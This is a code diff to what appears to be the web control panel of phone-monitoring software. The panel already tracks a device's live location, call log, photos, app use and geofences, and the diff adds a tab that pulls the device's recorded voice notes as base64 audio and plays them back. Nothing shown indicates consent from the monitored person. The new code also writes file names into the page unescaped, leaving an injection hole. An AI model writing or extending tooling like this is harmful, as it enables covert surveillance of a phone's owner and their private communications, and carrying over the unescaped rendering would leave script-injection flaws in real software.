@@ -52,6 +52,10 @@ td{padding:6px 4px;border-bottom:1px solid var(--border)}
 .lightbox{position:fixed;inset:0;background:rgba(0,0,0,.95);z-index:9999;display:none;justify-content:center;align-items:center;cursor:zoom-out}
 .lightbox.open{display:flex}
 .lightbox img{max-width:95vw;max-height:95vh;object-fit:contain}
+.voice-card{background:var(--card);padding:12px;margin-bottom:8px;border-radius:var(--radius);border-left:3px solid var(--accent)}
+.voice-card .vname{font-size:13px;font-weight:500;color:var(--text)}
+.voice-card .vmeta{font-size:11px;color:var(--muted);margin-top:2px}
+.voice-card audio{width:100%;margin-top:6px}
 .alert-banner{padding:8px 12px;font-size:12px;display:none}
 .alert-banner.show{display:block}
 .alert-banner.warn{background:rgba(255,202,40,.15);color:var(--accent);border-bottom:1px solid rgba(255,202,40,.3)}
@@ -83,6 +87,7 @@ body{display:grid;grid-template-columns:380px 1fr;grid-template-rows:auto 1fr;he
 <button class="tab-btn" data-tab="calls">&#x1F4DE; Calls</button>
 <button class="tab-btn" data-tab="apps">&#x1F4CA; Apps</button>
 <button class="tab-btn" data-tab="geofence">&#x2699; Geo</button>
+<button class="tab-btn" data-tab="voice">&#x1F3A4; Voice</button>
 </div>
 <div class="content" id="tabContent">
 <div class="active" id="tab-live">
@@ -114,6 +119,7 @@ body{display:grid;grid-template-columns:380px 1fr;grid-template-rows:auto 1fr;he
 <div id="tab-calls"><table><thead><tr><th>Time</th><th>Number</th><th>Duration</th><th>Type</th></tr></thead><tbody id="callsBody"></tbody></table></div>
 <div id="tab-apps"><div id="appsChart"></div></div>
 <div id="tab-geofence"><div id="geofenceList"></div></div>
+<div id="tab-voice"><div id="voiceNotesList"><div class="label">No voice notes yet</div></div></div>
 </div>
 </div>
 <div class="map-wrap">
@@ -155,7 +161,7 @@ let playbackTimer = null;
 
 // --- Poll Timers ---
 let pollTimers = [];
-const BASE_INTERVALS = { loc: 3000, hist: 60000, meta: 30000, photos: 60000, apps: 60000 };
+const BASE_INTERVALS = { loc: 3000, hist: 60000, meta: 30000, photos: 60000, apps: 60000, voice: 120000 };
 let intervals = { ...BASE_INTERVALS };
 
 // --- Init Map ---
@@ -385,6 +391,7 @@ function startPolling() {
   schedulePoll('photos', intervals.photos, pollPhotos);
   schedulePoll('apps', intervals.apps, pollApps);
   schedulePoll('hist', intervals.hist, pollHistory);
+  schedulePoll('voice', intervals.voice, pollVoiceNotes);
 }
 
 function schedulePoll(name, interval, fn) {
@@ -396,7 +403,7 @@ function schedulePoll(name, interval, fn) {
 }
 
 async function pollAll() {
-  const fns = [pollLocation(), pollMeta(), pollPhotos(), pollApps(), pollHistory()];
+  const fns = [pollLocation(), pollMeta(), pollPhotos(), pollApps(), pollHistory(), pollVoiceNotes()];
   for (const fn of fns) { try { await fn; } catch {} }
 }
 
@@ -558,6 +565,34 @@ async function pollHistory() {
     .sort((a, b) => (parseInt(b.ts_ms) || 0) - (parseInt(a.ts_ms) || 0));
   renderTimeline(docs.slice(0, 30));
   renderCalls(docs.slice(0, 30));
+}
+
+async function pollVoiceNotes() {
+  if (!selectedDevice) return;
+  const list = document.getElementById('voiceNotesList');
+  const data = await fetchRTDB(`devices/${selectedDevice}/voice_notes`);
+  if (!data || typeof data !== 'object') {
+    list.innerHTML = '<div class="label">No voice notes yet</div>';
+    return;
+  }
+  const batches = Object.values(data).sort((a, b) => (parseInt(b.ts_ms)||0) - (parseInt(a.ts_ms)||0));
+  let html = '';
+  for (const batch of batches) {
+    const notes = batch.notes || [];
+    for (const note of notes) {
+      const name = note.fileName || 'Voice note';
+      const dur = note.durationMs ? Math.round(note.durationMs/1000) + 's' : '';
+      const size = note.sizeBytes ? (note.sizeBytes/1024).toFixed(0) + 'KB' : '';
+      const date = note.dateAdded ? pkt(note.dateAdded * 1000) : '';
+      const hasAudio = note.audioData && note.audioData.length > 100;
+      html += `<div class="voice-card">
+        <div class="vname">${name}</div>
+        <div class="vmeta">${[date, dur, size].filter(Boolean).join(' \u2022 ')}</div>
+        ${hasAudio ? `<audio controls src="data:audio/ogg;base64,${note.audioData}"></audio>` : '<div class="vmeta" style="color:var(--danger)">Audio data not available (file too large)</div>'}
+      </div>`;
+    }
+  }
+  list.innerHTML = html || '<div class="label">No voice notes yet</div>';
 }
 
 // --- Update UI ---
